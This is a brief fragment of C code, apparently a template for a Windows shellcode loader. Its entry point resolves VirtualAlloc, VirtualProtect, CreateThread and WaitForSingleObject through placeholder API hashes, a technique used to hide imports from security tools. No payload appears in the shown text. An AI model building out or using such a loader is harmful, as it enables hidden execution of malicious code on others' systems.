...
void WINAPI EntryPoint(void) {
    uint32_t h_VirtualAlloc = {{HASH_VirtualAlloc}};
    uint32_t h_VirtualProtect = {{HASH_VirtualProtect}};
    uint32_t h_CreateThread = {{HASH_CreateThread}};
    uint32_t h_WaitForSingleObject = {{HASH_WaitForSingleObject}};
